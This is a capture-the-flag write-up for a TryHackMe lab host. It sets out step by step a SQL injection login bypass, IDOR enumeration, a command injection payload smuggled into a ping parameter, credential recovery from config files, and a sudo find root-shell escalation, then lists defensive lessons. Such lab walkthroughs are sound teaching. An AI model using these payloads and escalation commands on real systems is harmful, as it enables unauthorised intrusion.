# Operation Promotion

## Room

TryHackMe Jr Pentester Challenges — Operation Promotion. The target instance IP is assigned when the lab starts, so substitute the current `MACHINE_IP` in every command.

## Objective

Compromise RecruitCorp's public-facing Linux host, obtain the user flag, escalate to root, and read the root flag.

## Attack flow

```text
Port scan
  -> Web and SMB enumeration
  -> robots.txt reveals /admin/
  -> SQL injection bypasses admin login
  -> IDOR enumerates users and exposes ping.php
  -> Command injection in ping.php gives www-data
  -> Read application configuration and recover jford bcrypt hash
  -> Crack predictable password: <redacted-pw>
  -> SSH as jford and read user.txt
  -> sudo -l shows NOPASSWD find
  -> Abuse find to spawn a root shell
  -> Read /root/flag.txt
```

## Reproducible walkthrough

### 1. Enumerate services

```bash
nmap -p- --min-rate 5000 -T4 MACHINE_IP
nmap -sCV -p22,80,139,445 MACHINE_IP
```

Expected services are SSH (22), HTTP (80), and SMB/NetBIOS (139/445). Check the web root and robots file:

```bash
curl http://MACHINE_IP/robots.txt
```

The disallowed `/admin/` path identifies the administrative portal.

### 2. Bypass the admin login

Open `http://MACHINE_IP/admin/` and test the login form for SQL injection. A typical bypass is:

```text
admin' OR 1=1--
```

After login, inspect the user lookup functionality. Incrementing the numeric `id` parameter demonstrates an IDOR. The `sysmaint` account entry exposes the maintenance endpoint:

```text
/admin/sysmaint-checks/ping.php
```

### 3. Exploit command injection

The endpoint accepts a `host` parameter and executes ping. Append a shell command separator:

```text
http://MACHINE_IP/admin/sysmaint-checks/ping.php?host=127.0.0.1;id
```

The response should show execution as `www-data`. Use the same injection to obtain a reverse shell if needed, for example with a listener on the attacking machine and a URL-encoded Bash payload.

### 4. Recover SSH credentials

From the web shell, inspect the application files and configuration:

```bash
find /var/www -type f 2>/dev/null | sort
cat /var/www/html/config/db.conf
```

The configuration contains a bcrypt hash associated with `jford`. The site theme indicates a predictable password pattern (`spring` + year + `!`); generate a focused candidate list or crack the recovered hash. The working credential is:

```text
jford:<redacted-pw>
```

### 5. Read the user flag

```bash
ssh jford@MACHINE_IP
cat ~/user.txt
```

Observed result:

```text
THM{…}
```

### 6. Escalate to root

Check delegated sudo permissions:

```bash
sudo -l
```

The account can run `/usr/bin/find` as root without a password. Spawn a shell through `find`:

```bash
sudo find . -exec /bin/sh \; -quit
id
```

### 7. Read the root flag

```bash
cat /root/flag.txt
```

Observed result:

```text
THM{…}
```

## Lessons learned

- Do not expose administrative paths through `robots.txt` or leave them weakly protected.
- Use parameterized queries for authentication and object lookups; enforce authorization server-side to prevent IDOR.
- Never pass user input directly to a shell command.
- Keep application secrets and password hashes unreadable by the web service account.
- Avoid granting `sudo` access to shell-capable binaries such as `find`.

## Evidence note

The flag values above were cross-checked against public walkthroughs. Revalidate against the currently deployed room instance if TryHackMe rotates the machine contents.
